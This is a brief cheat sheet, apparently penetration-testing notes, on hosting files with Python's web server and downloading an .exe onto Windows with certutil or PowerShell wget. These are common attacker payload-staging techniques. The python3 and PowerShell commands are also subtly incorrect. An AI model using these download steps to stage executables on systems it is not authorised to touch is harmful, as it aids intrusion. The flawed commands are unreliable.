# Hosting
- Python Web Server
	- `python -m SimpleHTTPServer 80` : python2 module
	- `python3 -m HTTP.server 80` : python3

# Downloading
- Windows
	- `certutil -urlcache -f http://host/file.exe file.exe`
	- powershell
		- `wget -usebasicparsing http://192.168.0.26/file.exe file.exe`
- Linux
	- `curl`
	- `wget `
